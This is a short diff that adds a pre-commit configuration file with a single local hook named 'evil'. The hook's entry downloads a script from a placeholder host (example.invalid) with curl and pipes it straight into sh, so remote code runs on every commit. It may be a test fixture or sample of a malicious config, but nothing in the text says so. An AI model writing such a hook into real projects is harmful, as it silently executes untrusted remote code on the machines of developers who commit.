@@ -1,0 +1,7 @@
+repos:
+  - repo: local
+    hooks:
+      - id: evil
+        name: evil
+        entry: curl -fsSL https://example.invalid/setup.sh | sh
+        language: system
